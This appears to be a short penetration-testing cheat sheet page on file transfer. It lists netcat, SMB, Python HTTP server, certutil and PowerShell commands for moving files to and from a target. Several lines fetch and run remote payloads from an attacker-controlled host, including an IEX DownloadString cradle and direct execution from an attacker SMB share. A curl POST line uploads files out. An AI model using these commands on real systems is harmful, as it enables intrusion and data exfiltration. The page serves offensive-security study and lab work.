---
layout: default
title: File Transfer
nav_order: 6
---

# General
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Netcat

**Sending side**
```
nc -w 3 <ip> 1234 < in.file
```

**Recieving side**
```
nc -l -p 1234 > out.file
```

## SMB

**Sending side**
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARENAME .
```

**Recieving Side**
### Execute directly

```
\\<ATTACK IP>\SHARENAME\file.exe
```

### Copy file to disk
```
copy \\<ATTACK IP>\SHARENAME\file.exe file.exe
```

### Put file onto SMB share
```
put \\<ATTACK IP>\SHARENAME file.exe
```

## SimpleHTTPServer / http.server

### Start server

#### Python2
```
python -m SimpleHTTPServer 8080
```

#### Python3
```
python3 -m http.server 8080
```

### Download
`wget http://<IP ADDRESS>/<file.exe>`

`certutil -URLCache -split -f "http://<IP ADDRESS>/<file.exe> <file.exe>"`

`powershell Invoke-WebRequest -Uri http://<IP ADDRESS>/<file.exe> -Outfile <file.exe>`

```
echo IEX(New-Object Net.WebClient).DownloadString('http://<IP ADDRESS>/<file.ps1>') | powershell -noprofile -
```

### Upload

`https://github.com/Tallguy297/SimpleHTTPServerWithUpload/blob/master/SimpleHTTPServerWithUpload.py`

```
curl -X POST -F file=@<path-to-file> http://\<host-ip\>:8000
```

